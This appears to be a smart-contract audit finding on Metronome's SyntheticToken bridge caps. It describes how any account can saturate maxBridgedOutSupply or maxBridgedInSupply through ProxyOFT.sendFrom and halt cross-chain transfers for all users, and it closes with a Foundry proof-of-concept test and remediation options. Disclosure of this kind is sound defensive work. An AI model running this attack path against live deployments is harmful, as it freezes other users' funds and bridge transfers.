### Title
Unprivileged attacker can permanently saturate `maxBridgedOutSupply`/`maxBridgedInSupply` and halt all cross-chain transfers of a synthetic asset - ([File: contracts/SyntheticToken.sol](contracts/SyntheticToken.sol))

### Summary
The Teeworlds CVE is a remote, unprivileged shutdown of the whole service via a crafted message. The closest Metronome surface for "anyone can flip a global switch that stops the system" is not `Pauseable.shutdown()` (governor/guardian only, out of scope) but the bridge-conservation caps in `SyntheticToken._mint`/`_burn`. A permissionless `ProxyOFT.sendFrom` call lets any EOA permanently push `bridgedOutSupply()` or `bridgedInSupply()` to the governor-configured cap, after which every subsequent bridge transfer in that direction reverts with `SurpassMaxBridgingSupply` — an indefinite, attacker-controlled liveness failure for all users of that synthetic asset.

### Finding Description
`SyntheticToken._burn` increments `totalBridgedOut` and reverts when `bridgedOutSupply() > maxBridgedOutSupply`; symmetrically `_mint` reverts when `bridgedInSupply() > maxBridgedInSupply` [1](#0-0) [2](#0-1) . Both counters are monotonic cumulative totals, and the "supply" figure is `MAX(totalBridgedOut - totalBridgedIn, 0)` [3](#0-2) .

Attack path (bridged-out direction):

1. Attacker acquires synth on chain A — legitimately via `DebtToken.issue` against deposited collateral, or cheaply by buying the synth on an AMM.
2. Attacker calls `ProxyOFT.sendFrom` (public, `ProxyOFT._debitFrom` → `SyntheticToken.burn`) moving the synth to chain B. They repeat/scale this until `bridgedOutSupply() == maxBridgedOutSupply`.
3. Every subsequent `sendFrom` by any user reverts in `_burn` with `SurpassMaxBridgingSupply`.

Because only the attacker holds the bridged synth on chain B, only the attacker can bridge back to lower `bridgedOutSupply()`. The governor can raise the cap via `updateMaxBridgedOutSupply`, but the attacker can simply re-saturate the new cap (the marginal cost is just LayerZero fees once the synth position exists). The symmetric `bridgedInSupply` variant freezes inbound deliveries, stranding users' in-flight bridge transfers on the source chain.

No modifier stops this: `sendFrom`/`_debitFrom` is permissionless, caps are checked only against net counters, and `onlyIfCanBurn`/`onlyIfCanMint` admit `ProxyOFT` by design [4](#0-3) .

### Impact Explanation
Liveness invariant break: bridging for a synthetic asset halts in one direction for all users until governance intervenes or the attacker chooses to reverse. Users holding synth on the saturated chain cannot bridge out — temporary freezing of funds with an attacker-controlled duration. The inbound variant also strands retryable OFT payloads (deliveries revert at `_creditTo` → `_mint`), permanently blocking those specific bridged funds since `retryOFTReceived` will keep reverting at the same cap check.

### Likelihood Explanation
The capital cost equals the cap value of synths, but the position is recoverable (attacker still owns the synth on the destination chain and can bridge/sell back), so the attack's real cost is only LayerZero fees and capital lock-up — far cheaper than most cap-exhaustion attacks because the cap is net (`out - in`), not cumulative. Deployed configs that set a finite `maxBridgedOutSupply`/`maxBridgedInSupply` are exposed by default; caps of `type(uint256).max` are safe.

### Recommendation
Decouple the "per-direction halt" from a saturatable public counter. Options: (a) apply the cap check to cumulative per-direction volume but make it a rate limit that decays over time rather than a permanent latch; (b) keep the cap but let the reverse direction always succeed and additionally let governance reset/offset the counters without requiring the attacker to cooperate; (c) treat hitting the cap as an automatic one-directional pause that emits an alert, with a documented `open()` path. At minimum, cap checks should not be satisfiable solely by the attacker holding the offsetting tokens on the remote chain.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// Foundry fork test sketch — run against a deployed chain with finite bridge caps.
// Assumes: pool, synth (msUSD-like), depositToken, proxyOFT deployed and configured.

function test_bridgeCapSaturationDoS() public {
    uint16 dstChain = LZ_CHAIN_B;
    uint256 cap = synth.maxBridgedOutSupply();
    require(cap < type(uint256).max, "cap not set - not vulnerable");

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    // 1. Attacker obtains `cap` synth (buy on AMM or issue via DebtToken against collateral).
    deal(address(collateral), attacker, collateralNeeded);
    vm.startPrank(attacker);
    collateral.approve(address(depositToken), collateralNeeded);
    depositToken.deposit(collateralNeeded);
    debtToken.issue(cap);            // attacker mints synths; position is healthy
    vm.stopPrank();

    // 2. Attacker bridges out until cap is saturated (batched as needed for per-msg limits).
    vm.startPrank(attacker);
    synth.approve(address(proxyOFT), cap);
    proxyOFT.sendFrom{value: fee}(attacker, dstChain, bytes32(uint256(uint160(attacker))),
                                  cap, payable(attacker), attacker, bytes(""));
    vm.stopPrank();
    assertEq(synth.bridgedOutSupply(), cap);

    // 3. Victim's outbound bridge now reverts for ANY amount > 0.
    deal(address(synth), victim, 1 ether);
    vm.startPrank(victim);
    synth.approve(address(proxyOFT), 1 ether);
    vm.expectRevert(SurpassMaxBridgingSupply.selector);
    proxyOFT.sendFrom{value: fee}(victim, dstChain, bytes32(uint256(uint160(victim))),
                                  1, payable(victim), victim, bytes(""));
    vm.stopPrank();

    // 4. Only the attacker (holder of bridged tokens on chain B) or the governor
    //    (raising the cap) can restore bridging — attacker-controlled DoS.
}
```

Note: I was unable to fully verify the deployed `maxBridgedOutSupply`/`maxBridgedInSupply` values on each chain from the indexed deployment artifacts; if all caps are `type(uint256).max` in production, the analog does not apply to those deployments. The code path itself is unconditionally reachable whenever a finite cap is configured.
